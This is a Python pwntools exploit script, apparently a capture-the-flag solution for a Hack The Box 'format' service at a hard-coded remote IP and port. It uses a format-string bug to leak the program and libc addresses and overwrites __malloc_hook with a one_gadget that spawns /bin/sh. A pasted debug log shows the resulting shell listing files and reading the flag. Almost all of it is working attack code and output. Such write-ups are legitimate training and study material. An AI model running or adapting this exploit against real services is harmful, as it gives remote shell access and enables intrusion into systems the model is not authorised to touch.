from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

def detect(io):
	io.sendline('ABCDEFGHABCDEFGH.'+'%p.'*88)
	buf = io.recvline().strip().split('.')
	for i in range(len(buf)):
		print str(i+1)+' : '+buf[i]

#io = process('./format')
ip, port = '165.227.231.233', 32029
io = remote(ip, port)

elf = ELF('./format')
libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')

#detect(io)
'''
Local debug seems different from remote...

$6 is offset
$41 is return address 0x12b3

Input address and access *address, offset is 7 (6+1)
'''
io.sendline('%41$p')
echo_ret_addr = int(io.recvline().strip(), 16)
elf_base = echo_ret_addr - 0x12b3

elf.address = elf_base
io.sendline('AAAA%7$s' + p64(elf.got.fgets))
#print hex(u64(io.recv(16)[4:10].ljust(8, '\x00')))
fgets_addr = u64(io.recv(16)[4:10].ljust(8, '\x00'))
#serch libc: https://libc.blukat.me -> libc6_2.27-3ubuntu1_amd64.so
#libc RELRO:    Partial RELRO -> try to overwirte __malloc_hook
libc_base = fgets_addr - libc.sym.fgets
libc.address = libc_base

'''
one_gadget ./libc6_2.27-3ubuntu1_amd64.so 
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
one_gadget = libc_base + 0x4f322
payload = fmtstr_payload(6, {libc.sym.__malloc_hook : one_gadget})

io.sendline(payload)
io.recv()
io.sendline('%1000000c') #trigger allocate large space and call __malloc_hook()
io.interactive()

'''
DEBUG] Sent 0xa bytes:
    '%1000000c\n'
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0x21 bytes:
    'flag.txt\n'
    'format\n'
    'run_challenge.sh\n'
flag.txt
format
run_challenge.sh
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    'cat flag.txt\n'
[DEBUG] Received 0x1e bytes:
    'HTB{mall0c_h00k_f0r_th3_w1n!}\n'
HTB{mall0c_h00k_f0r_th3_w1n!}
'''
